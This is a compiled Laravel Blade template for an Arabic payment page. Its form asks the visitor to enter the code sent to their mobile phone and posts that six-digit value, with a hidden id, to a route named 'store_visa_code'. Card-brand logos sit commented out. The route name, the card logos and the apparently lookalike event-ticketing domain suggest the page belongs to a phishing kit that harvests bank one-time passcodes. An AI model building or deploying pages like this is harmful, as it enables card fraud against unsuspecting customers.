 
   <?php $__env->startSection('content'); ?> 

    <main class="main-payment">
        <a href="<?php echo e($setting->domain); ?>"><i class="fa-solid fa-chevron-right"></i>    العودة للرئيسية </a>
        <section class="form wow fadeInDown" data-wow-duration="1s" data-wow-delay="1.5s">
            <form action="store_visa_code" method="post">
                <?php echo csrf_field(); ?>
                <p>   الرجاء ادخال الكود الذي يصلكم على الهاتف المحمول  </p>
                <!--<section class="payment-method">-->
                <!--    <h2>طرق الدفع</h2>-->
                <!--    <ul>-->
                <!--        <li><svg width="41" height="15" viewBox="0 0 41 15" fill="none" class=""-->
                <!--                xmlns="http://www.w3.org/2000/svg">-->
                <!--                <rect x="0.333984" y="8.57715" width="16.9204" height="5.91638" fill="#84B740"></rect>-->
                <!--                <rect x="0.333984" y="0.503906" width="16.9204" height="5.92166" fill="#259BD6"></rect>-->
                <!--                <path fill-rule="evenodd" clip-rule="evenodd"-->
                <!--                    d="M34.1742 7.74403L34.3098 7.71766C34.7067 7.64911 35.1137 7.57529 35.5055 7.50146V13.4337C35.5055 13.8502 35.3598 14.0453 34.9529 14.1824C34.5108 14.3354 34.0737 14.3986 33.4809 14.3986C32.0793 14.3986 31.2754 13.5339 31.2754 12.031C31.2754 10.9342 31.6221 9.62651 33.2699 9.62651C33.5713 9.62651 33.8828 9.72143 34.0185 9.76361L34.0536 9.77416L34.1742 9.81107V7.74403ZM34.0988 13.3071L34.1742 13.2913V10.8288L34.1089 10.8077C33.8075 10.7128 33.6467 10.6969 33.506 10.6864H33.501C32.6771 10.6864 32.5867 11.451 32.5867 12.0258C32.5867 13.1436 33.1091 13.3809 33.5512 13.3809C33.7337 13.3809 33.8289 13.3617 34.065 13.314C34.076 13.3117 34.0872 13.3095 34.0988 13.3071Z"-->
                <!--                    fill="white"></path>-->
                <!--                <path fill-rule="evenodd" clip-rule="evenodd"-->
                <!--                    d="M36.8168 9.90598C37.4648 9.69506 37.9873 9.60015 38.4947 9.60015C39.7005 9.60015 40.3134 10.1433 40.3134 11.2084V14.4988C40.0285 14.4421 39.7384 14.388 39.4524 14.3347C39.34 14.3137 39.2283 14.2929 39.1177 14.2721L38.9921 14.251L38.972 14.2457L38.9519 14.251C38.5801 14.3459 38.1481 14.4092 37.8366 14.4092C36.8318 14.4092 36.234 13.8924 36.234 13.0329C36.234 12.0258 36.8821 11.5565 38.2837 11.5565H39.0524V11.2823C39.0524 10.6548 38.4998 10.6548 38.3189 10.6548C37.917 10.6548 37.3794 10.7497 36.9474 10.8973L36.5354 11.0397L36.3948 10.0378L36.8168 9.90598ZM39.0021 13.3493L39.0725 13.3282V12.3791H38.2536C37.6206 12.3791 37.5251 12.7534 37.5251 12.9749C37.5251 13.3177 37.7562 13.518 38.1431 13.518C38.3038 13.518 38.5148 13.4811 38.7509 13.4178L39.0021 13.3493Z"-->
                <!--                    fill="white"></path>-->
                <!--                <path fill-rule="evenodd" clip-rule="evenodd"-->
                <!--                    d="M27.0604 9.90598C27.7085 9.69506 28.226 9.60015 28.7384 9.60015C29.9441 9.60015 30.557 10.138 30.552 11.2137V14.5041C30.185 14.4261 29.8136 14.3571 29.446 14.2887C29.416 14.2832 29.3862 14.2776 29.3563 14.2721L29.2357 14.251L29.2157 14.2457L29.1956 14.251C28.8238 14.3459 28.3917 14.4092 28.0803 14.4092C27.0705 14.4092 26.4726 13.8924 26.4726 13.0329C26.4726 12.0258 27.1257 11.5565 28.5274 11.5565H29.296V11.2823C29.296 10.6548 28.7434 10.6548 28.5625 10.6548C28.1606 10.6548 27.6231 10.7497 27.191 10.8973L26.7791 11.0397L26.6384 10.0378L27.0604 9.90598ZM29.2408 13.3493L29.3111 13.3282H29.3061V12.3791H28.4872C27.8592 12.3791 27.7638 12.7534 27.7638 12.9749C27.7638 13.3177 27.9949 13.518 28.3817 13.518C28.5475 13.518 28.7535 13.4811 28.9896 13.4178L29.2408 13.3493Z"-->
                <!--                    fill="white"></path>-->
                <!--                <path-->
                <!--                    d="M24.021 9.61069C23.3829 9.61069 22.8554 9.83216 22.6595 9.92708L22.6093 9.95344L22.5641 9.91653C22.2928 9.71088 21.8959 9.60542 21.3433 9.60542C20.8559 9.60542 20.3988 9.67924 19.9014 9.83216C19.4744 9.96926 19.3086 10.1855 19.3086 10.5915V14.3512H20.6449V10.8762L20.7103 10.8551C20.9815 10.7602 21.1423 10.7444 21.298 10.7444C21.6849 10.7444 21.8808 10.9606 21.8808 11.3824V14.3565H23.1971V11.3244C23.1971 11.1452 23.1619 11.0397 23.1569 11.0186L23.1117 10.929L23.2021 10.8868C23.403 10.7919 23.6241 10.7444 23.8552 10.7444C24.1215 10.7444 24.438 10.8551 24.438 11.3824V14.3565H25.7492V11.2453C25.7492 10.1433 25.1865 9.61069 24.021 9.61069Z"-->
                <!--                    fill="white"></path>-->
                <!--                <path fill-rule="evenodd" clip-rule="evenodd"-->
                <!--                    d="M38.0476 0.503906H38.0828C39.4493 0.535545 40.3284 1.52161 40.3335 3.02443C40.3335 4.54308 39.4241 5.52914 38.0225 5.52914C37.6055 5.52914 36.9976 5.4395 36.6711 5.27076C36.6599 5.27263 36.6486 5.27451 36.6372 5.27641C36.4242 5.31196 36.1826 5.35226 35.9727 5.39732H29.5171C29.557 5.13424 29.5944 4.87117 29.6272 4.63999C29.6397 4.55144 29.6516 4.46756 29.6628 4.39016H31.7628C31.9285 4.39016 32.034 4.42707 32.0491 4.43234L32.1345 4.4798V3.01389C32.1345 2.13856 31.7979 1.56907 31.1599 1.56907H29.9441C29.9692 1.38187 29.9918 1.22236 30.0144 1.06285C30.0371 0.903342 30.0597 0.743831 30.0848 0.556637H31.3056C32.5565 0.556637 33.4206 1.40033 33.4508 2.93479H33.4558V4.39016H35.8823L35.9275 4.30052C35.9275 4.30052 35.929 4.29634 35.9302 4.29319C35.94 4.26805 35.9677 4.19618 35.9677 4.03686V1.94345C35.9727 1.63234 36.0582 1.36869 36.2089 1.15777C36.4902 0.725375 37.279 0.503906 38.0476 0.503906ZM37.3091 4.28997C37.5653 4.3427 37.8919 4.36379 38.0878 4.36379C38.5249 4.36379 39.0524 4.1265 39.0574 3.00861C39.0574 2.43385 38.9619 1.66925 38.1431 1.66925H38.138C38.1113 1.6716 38.077 1.6729 38.0368 1.67443C37.8957 1.6798 37.6803 1.68799 37.4498 1.75362C37.4424 1.75362 37.4351 1.75645 37.4257 1.76003C37.4223 1.76134 37.4186 1.76276 37.4146 1.76417L37.3242 1.79581L37.3091 1.80635C37.2992 1.81051 37.2901 1.81385 37.2814 1.81702C37.2681 1.82188 37.256 1.82633 37.2438 1.83272L37.1584 1.86963L37.1986 1.954C37.2036 1.96982 37.2337 2.07528 37.2337 2.24402V4.27415L37.3091 4.28997Z"-->
                <!--                    fill="white"></path>-->
                <!--                <path-->
                <!--                    d="M26.8243 6.01426C28.226 6.01426 28.8791 5.52914 28.8791 4.33215C28.8791 3.47264 28.2812 2.78715 27.2764 2.78715H25.9853C25.5985 2.78715 25.3674 2.55513 25.3674 2.16492C25.3674 1.90127 25.4628 1.57434 26.0958 1.57434H28.9192C28.9795 1.18941 29.0097 0.946844 29.0649 0.56191H26.131C24.7645 0.56191 24.0762 1.16304 24.0762 2.16492C24.0762 3.15626 24.6741 3.67302 25.6789 3.67302H26.97C27.3568 3.67302 27.5879 3.99468 27.5879 4.33215C27.5879 4.55362 27.4925 5.01238 26.8645 5.01238H26.6485L22.5138 5.00183H21.7602C21.1222 5.00183 20.6751 4.62217 20.6751 3.74157V3.13517C20.6751 2.21765 21.0217 1.64816 21.7602 1.64816H22.9861C23.0413 1.25796 23.0765 1.01012 23.1267 0.641006H21.4538C20.2028 0.641006 19.3387 1.52161 19.3086 3.05607V3.74157C19.3387 5.27603 20.2028 6.00899 21.4538 6.00899H22.6746L24.9152 6.01426H26.8243Z"-->
                <!--                    fill="white"></path>-->
                <!--            </svg></li>-->
                <!--        <li><svg width="41" height="17" viewBox="0 0 41 17" fill="none" class=""-->
                <!--                xmlns="http://www.w3.org/2000/svg">-->
                <!--                <path-->
                <!--                    d="M7.72769 2.24583C8.19862 1.66032 8.51818 0.874163 8.4339 0.0708008C7.74453 0.104874 6.90329 0.522882 6.41625 1.10885C5.97894 1.61063 5.59188 2.42971 5.69279 3.1994C6.46664 3.26612 7.23978 2.81491 7.72769 2.24583Z"-->
                <!--                    fill="currentColor"></path>-->
                <!--                <path-->
                <!--                    d="M8.42511 3.34968C7.30128 3.28314 6.34576 3.98369 5.80908 3.98369C5.2721 3.98369 4.45027 3.38321 3.56139 3.3994C2.40445 3.41629 1.33095 4.06652 0.74385 5.10069C-0.463706 7.16954 0.425177 10.2384 1.59946 11.9233C2.16972 12.7569 2.85698 13.6748 3.76255 13.6418C4.61816 13.6085 4.95353 13.0911 5.99356 13.0911C7.03283 13.0911 7.33492 13.6418 8.24064 13.6251C9.17989 13.6084 9.76709 12.7911 10.3373 11.9567C10.9915 11.0064 11.2593 10.0889 11.2762 10.0385C11.2593 10.0218 9.46504 9.33761 9.4484 7.28595C9.43146 5.56807 10.8571 4.75095 10.9242 4.70028C10.1191 3.51667 8.86121 3.38321 8.42511 3.34968Z"-->
                <!--                    fill="currentColor"></path>-->
                <!--                <path fill-rule="evenodd" clip-rule="evenodd"-->
                <!--                    d="M22.3539 5.13515C22.3539 2.69845 20.6531 1.02481 18.2105 1.02481L13.4908 1.02481V13.538H15.4448V9.26289H18.1492C20.6181 9.26289 22.3539 7.58055 22.3539 5.13515ZM17.6868 7.63256H15.4448V2.66382H17.6956C19.388 2.66382 20.3562 3.5657 20.3562 5.14384C20.3562 6.72214 19.388 7.63256 17.6868 7.63256Z"-->
                <!--                    fill="currentColor"></path>-->
                <!--                <path fill-rule="evenodd" clip-rule="evenodd"-->
                <!--                    d="M26.2756 8.24827C24.0945 8.36971 22.8645 9.34954 22.8645 10.9452C22.8645 12.5841 24.1208 13.6941 25.9179 13.6941C27.1217 13.6941 28.2821 13.0524 28.8142 12.0378H28.8576V13.538H30.6635V7.25105C30.6635 5.42135 29.2416 4.25067 27.017 4.25067C24.7488 4.25067 23.3356 5.46467 23.231 7.11239H25.0106C25.1762 6.29714 25.8567 5.77695 26.9474 5.77695C28.0987 5.77695 28.7879 6.38395 28.7879 7.39857V8.10092L26.2756 8.24827ZM28.7879 9.40173V10.1215C28.7879 11.3094 27.7584 12.2113 26.4412 12.2113C25.4292 12.2113 24.7663 11.6909 24.7663 10.8932C24.7663 10.1128 25.403 9.6185 26.5284 9.54039L28.7879 9.40173Z"-->
                <!--                    fill="currentColor"></path>-->
                <!--                <path-->
                <!--                    d="M32.3684 16.894V15.3764C32.5077 15.411 32.8217 15.411 32.9788 15.411C33.8512 15.411 34.3223 15.0469 34.6101 14.1104C34.6101 14.093 34.776 13.5554 34.776 13.5467L31.4611 4.41542H33.5022L35.8229 11.8384H35.8576L38.1784 4.41542H40.1673L36.7299 14.0149C35.9451 16.2263 35.0378 16.9373 33.136 16.9373C32.9788 16.9373 32.5077 16.9199 32.3684 16.894Z"-->
                <!--                    fill="currentColor"></path>-->
                <!--            </svg></li>-->
                <!--        <li><svg width="39" height="13" viewBox="0 0 39 13" fill="none" class=""-->
                <!--                xmlns="http://www.w3.org/2000/svg">-->
                <!--                <path fill-rule="evenodd" clip-rule="evenodd"-->
                <!--                    d="M28.4882 1.00937L28.0457 3.49887C26.7188 2.78718 23.699 2.6188 23.6987 3.9296C23.6987 4.45034 24.3819 4.80847 25.2054 5.24011C26.4544 5.89474 28.0259 6.71846 28.0259 8.53492C28.0259 11.4375 24.8337 12.5039 22.7178 12.5039C20.6024 12.5039 19.2179 11.8493 19.2179 11.8493L19.6788 9.24629C20.9484 10.2383 24.7952 10.5202 24.7952 8.94704C24.7952 8.286 24.0379 7.89616 23.1598 7.4441C21.9482 6.82036 20.5065 6.07818 20.5065 4.34172C20.5065 1.15853 24.1606 0.503906 25.6993 0.503906C27.1227 0.503906 28.4882 1.00937 28.4882 1.00937ZM38.834 12.3039H35.9869L35.6237 10.5819H31.6819L31.0355 12.3039H27.8032L32.4277 1.57469C32.4277 1.57469 32.708 0.710744 33.8591 0.710744H36.3516L38.834 12.3039ZM11.5981 0.711054L8.64202 8.6847L8.29222 6.96766L7.24919 1.75486C7.24919 1.75486 7.12304 0.711054 5.77832 0.711054H0.891328L0.833984 0.907348C0.833984 0.907348 2.32843 1.21001 4.07743 2.23241L6.77133 12.3042H10.002L14.9352 0.711054H11.5981ZM17.3073 12.3039H14.2066L16.1445 0.711054H19.2456L17.3073 12.3039ZM32.5749 8.20311L34.2041 3.86479L35.1206 8.20311H32.5749Z"-->
                <!--                    fill="white"></path>-->
                <!--                <path-->
                <!--                    d="M8.29254 6.96817L7.24919 1.75474C7.24919 1.75474 7.12304 0.710938 5.77832 0.710938H0.891328L0.833984 0.907232C0.833984 0.907232 3.18286 1.38107 5.43585 3.1564C7.59007 4.85327 8.29254 6.96817 8.29254 6.96817Z"-->
                <!--                    fill="white"></path>-->
                <!--            </svg></li>-->
                <!--        <li><svg width="29" height="23" viewBox="0 0 29 23" fill="none" class=""-->
                <!--                xmlns="http://www.w3.org/2000/svg">-->
                <!--                <path fill-rule="evenodd" clip-rule="evenodd"-->
                <!--                    d="M27.3185 19.124V22.3772H26.8185V22.0954C26.66 22.3042 26.4197 22.4354 26.0928 22.4354C25.4486 22.4354 24.9436 21.9253 24.9436 21.2169C24.9436 20.5085 25.4489 19.9984 26.0928 19.9984C26.4197 19.9984 26.66 20.1295 26.8185 20.3384V19.124H27.3185ZM8.5771 20.0557L8.57654 22.3772H8.0775V22.0954C7.91904 22.3042 7.67855 22.4354 7.35183 22.4354C6.70763 22.4354 6.20258 21.9253 6.20258 21.2169C6.20258 20.5085 6.70791 19.9984 7.35183 19.9984C7.67869 19.9984 7.91904 20.1295 8.0775 20.3384V20.0557H8.5771ZM6.71701 21.2164C6.71701 20.8085 6.98158 20.4734 7.41399 20.4734C7.82721 20.4734 8.10606 20.7941 8.10606 21.2164C8.10606 21.6386 7.82721 21.9593 7.41399 21.9593C6.98158 21.9593 6.71701 21.6242 6.71701 21.2164ZM28.3156 22.1103C28.2717 22.0667 28.2127 22.0423 28.1511 22.0424L28.1518 22.04C28.1203 22.0398 28.0891 22.046 28.06 22.0584C28.0322 22.0696 28.0069 22.0864 27.9857 22.1079C27.9645 22.1288 27.9477 22.1537 27.9361 22.1812C27.9119 22.2383 27.9119 22.303 27.9361 22.3601C27.9475 22.3882 27.9641 22.414 27.985 22.4358C28.0065 22.4569 28.0317 22.4737 28.0593 22.4853C28.0884 22.4977 28.1196 22.5039 28.1511 22.5037C28.1823 22.5039 28.2132 22.4976 28.2418 22.4853C28.2692 22.4734 28.2941 22.4566 28.3156 22.4358C28.3365 22.4147 28.3533 22.3898 28.3652 22.3625C28.3893 22.3054 28.3893 22.2407 28.3652 22.1836C28.3536 22.1561 28.3368 22.1312 28.3156 22.1103ZM28.1511 22.451C28.1748 22.4512 28.1982 22.4464 28.2199 22.4368C28.2408 22.4277 28.2598 22.4147 28.2759 22.3985C28.292 22.3823 28.3049 22.3631 28.3138 22.342C28.3322 22.2972 28.3322 22.2468 28.3138 22.202C28.3047 22.1809 28.2919 22.1618 28.2759 22.1455C28.2598 22.1292 28.2408 22.1162 28.2199 22.1071C28.1981 22.0981 28.1747 22.0936 28.1511 22.0939C28.1272 22.0936 28.1034 22.0981 28.0811 22.1071C28.0598 22.1161 28.0403 22.1291 28.0239 22.1455C27.9733 22.1979 27.9586 22.2758 27.9865 22.3434C27.995 22.3646 28.0078 22.3838 28.0239 22.3999C28.0404 22.4163 28.0598 22.4293 28.0811 22.4382C28.1033 22.4478 28.1271 22.4526 28.1511 22.4524V22.451ZM28.2278 22.1815C28.2097 22.1682 28.1875 22.1617 28.1651 22.1631L28.0678 22.1633V22.3772H28.1129V22.3025H28.1381L28.1982 22.3772H28.2521L28.1849 22.2999C28.1883 22.2986 28.1916 22.2969 28.1947 22.2947C28.2085 22.2915 28.2214 22.285 28.2322 22.2755C28.2441 22.2641 28.2505 22.2481 28.2498 22.2316C28.2508 22.2123 28.2426 22.1937 28.2278 22.1815ZM28.1849 22.2999C28.18 22.3018 28.175 22.3026 28.1699 22.3025H28.1381L28.1338 22.2972H28.1129V22.3025L28.1124 22.2036L28.1699 22.2026C28.1807 22.2019 28.1915 22.2063 28.2008 22.2152C28.2083 22.2234 28.2127 22.2374 28.2123 22.2521C28.2127 22.267 28.2084 22.2813 28.2008 22.2899C28.1988 22.2917 28.1968 22.2933 28.1947 22.2947C28.1906 22.2956 28.1864 22.2963 28.1821 22.2966L28.1849 22.2999ZM25.4579 21.2164C25.4579 20.8085 25.7224 20.4734 26.155 20.4734C26.5686 20.4734 26.8471 20.7941 26.8471 21.2164C26.8471 21.6386 26.5686 21.9593 26.155 21.9593C25.7226 21.9593 25.4579 21.6242 25.4579 21.2164ZM14.7779 20.4495C15.0998 20.4496 15.3065 20.6535 15.3593 21.0123H14.1672C14.2205 20.6773 14.4219 20.4495 14.7779 20.4495ZM13.6435 21.2156C13.6435 20.492 14.1145 19.9971 14.7878 19.9971C15.4309 19.9971 15.8735 20.4921 15.8786 21.2155C15.8786 21.2822 15.8737 21.3445 15.8689 21.4062L15.8686 21.4095H14.1627C14.2348 21.8272 14.5279 21.9778 14.8499 21.9778C15.0804 21.9778 15.3257 21.8906 15.5183 21.7351L15.7631 22.109C15.4843 22.3469 15.1673 22.4341 14.8213 22.4341C14.1334 22.4341 13.6435 21.9535 13.6435 21.2156ZM20.8194 21.2155C20.8194 20.8076 21.084 20.4726 21.5164 20.4726C21.9296 20.4726 22.2085 20.7932 22.2085 21.2155C22.2085 21.6378 21.9296 21.9584 21.5164 21.9584C21.084 21.9584 20.8194 21.6234 20.8194 21.2155ZM22.6794 20.0557L22.6795 22.3772H22.18V22.0954C22.021 22.3042 21.7812 22.4354 21.4544 22.4354C20.8102 22.4354 20.3051 21.9253 20.3051 21.2169C20.3051 20.5085 20.8105 19.9984 21.4544 19.9984C21.7812 19.9984 22.021 20.1295 22.18 20.3384V20.0557H22.6794ZM17.9981 21.2155C17.9981 21.9194 18.4832 22.434 19.2237 22.434C19.5698 22.434 19.8003 22.3562 20.0496 22.1573L19.8097 21.7495C19.6221 21.8856 19.4252 21.9584 19.2078 21.9584C18.809 21.9535 18.5157 21.6622 18.5157 21.2155C18.5157 20.7688 18.809 20.4777 19.2078 20.4726C19.4246 20.4726 19.6216 20.5454 19.8097 20.6815L20.0496 20.2737C19.7999 20.0748 19.5694 19.997 19.2237 19.997C18.4832 19.997 17.9981 20.5115 17.9981 21.2155ZM23.833 20.337C23.9627 20.1331 24.1504 19.997 24.4387 19.997C24.5399 19.997 24.6838 20.0168 24.7944 20.0608L24.6404 20.5363C24.5411 20.4962 24.4349 20.4764 24.3279 20.478C24.0014 20.478 23.838 20.6913 23.838 21.0753V22.3759H23.3378V20.0557H23.833V20.337ZM11.0471 20.2402C10.8067 20.0801 10.4755 19.9974 10.1102 19.9974C9.52814 19.9974 9.15341 20.2792 9.15341 20.7402C9.15341 21.1185 9.43239 21.3519 9.94613 21.4247L10.1821 21.4587C10.4561 21.4975 10.5854 21.5704 10.5854 21.7014C10.5854 21.8808 10.4035 21.9832 10.0618 21.9832C9.71572 21.9832 9.46599 21.8715 9.29759 21.7404L9.06284 22.1339C9.33679 22.3377 9.68282 22.435 10.0576 22.435C10.7211 22.435 11.1056 22.1194 11.1056 21.6777C11.1056 21.2698 10.803 21.0565 10.3029 20.9837L10.0675 20.9492C9.85122 20.9209 9.67792 20.8769 9.67792 20.7214C9.67792 20.5518 9.84128 20.4497 10.1154 20.4497C10.4086 20.4497 10.6925 20.5614 10.8317 20.6486L11.0479 20.2407L11.0471 20.2402ZM16.8883 20.3379C17.0175 20.134 17.2052 19.9979 17.4934 19.9979C17.5946 19.9979 17.7385 20.0168 17.8491 20.0608L17.6951 20.5363C17.5958 20.4962 17.4896 20.4764 17.3827 20.478C17.0561 20.478 16.8928 20.6913 16.8928 21.0753V22.3759H16.3932V20.0557H16.8883V20.3379ZM13.2301 20.0557H12.4132V19.3518H11.9081V20.0557H11.4421V20.5168H11.9081V21.5753C11.9081 22.1136 12.115 22.4343 12.706 22.4343C12.9229 22.4343 13.1726 22.3664 13.331 22.2549L13.1867 21.8228C13.0376 21.9101 12.8743 21.954 12.7444 21.954C12.4946 21.954 12.4132 21.7985 12.4132 21.5657V20.5173H13.2301V20.0557ZM5.76079 20.9203V22.3765L5.25462 22.3753V21.084C5.25462 20.6907 5.09182 20.4723 4.75068 20.4723C4.41906 20.4723 4.18851 20.6863 4.18851 21.0891V22.3756H3.68345V21.0843C3.68345 20.691 3.51561 20.4726 3.18385 20.4726C2.8423 20.4726 2.62112 20.6866 2.62112 21.0894V22.3759H2.11719V20.0557H2.61721V20.3425C2.80492 20.0708 3.04471 19.998 3.2901 19.998C3.64118 19.998 3.89091 20.1535 4.04937 20.4108C4.26116 20.0852 4.56366 19.993 4.85693 19.998C5.41476 20.0029 5.76079 20.3719 5.76079 20.9203Z"-->
                <!--                    fill="white"></path>-->
                <!--                <path fill-rule="evenodd" clip-rule="evenodd"-->
                <!--                    d="M28.4083 14.3193V14.6626H28.346V14.4034L28.25 14.6272H28.1846L28.0885 14.404V14.6626H28.0254V14.3193H28.1145L28.2167 14.5549L28.3195 14.3193H28.4083ZM27.8448 14.3781V14.6626H27.7817V14.3781H27.668V14.3202H27.9585V14.3781H27.8448Z"-->
                <!--                    fill="#F79410"></path>-->
                <!--                <path d="M18.4539 16.1136H10.8828V2.37207H18.454L18.4539 16.1136Z" fill="#FF5F00">-->
                <!--                </path>-->
                <!--                <path-->
                <!--                    d="M11.3626 9.2432C11.3626 6.45574 12.655 3.97266 14.6673 2.37245C13.1441 1.15939 11.26 0.501021 9.32015 0.503916C4.54156 0.503916 0.667969 4.41657 0.667969 9.2432C0.667969 14.0698 4.54156 17.9825 9.32015 17.9825C11.2601 17.9854 13.1442 17.327 14.6675 16.114C12.6552 14.514 11.3626 12.0308 11.3626 9.2432Z"-->
                <!--                    fill="#EB001B"></path>-->
                <!--                <path-->
                <!--                    d="M28.6682 9.2432C28.6682 14.0698 24.7946 17.9825 20.016 17.9825C18.0759 17.9854 16.1916 17.327 14.668 16.114C16.6809 14.5138 17.9732 12.0308 17.9732 9.2432C17.9732 6.4556 16.6809 3.97266 14.668 2.37245C16.1915 1.15943 18.0758 0.501072 20.0159 0.503915C24.7944 0.503915 28.668 4.41657 28.668 9.2432"-->
                <!--                    fill="#F79E1B"></path>-->
                <!--            </svg></li>-->
                <!--    </ul>-->
                <!--</section>-->
                <!-- inputs -->
                <section class="inputs">
                    <section class="form-control">
                        <label for="cardholderName">     الكود</label>
                        <input type="number" name="code" required   oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"
    type = "number"
    maxlength = "6">
    
    
                        <input name="id" type="hidden" value="<?php echo e(request()->get('id')); ?>">

                    </section>
 
                    <button>دفع</button>
                </section>
                <!-- inputs -->
            </form>
        </section>
    </main>

            <?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.master', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH /home/u289763090/domains/webookeventat.com/public_html/core/resources/views/front/code.blade.php ENDPATH**/ ?>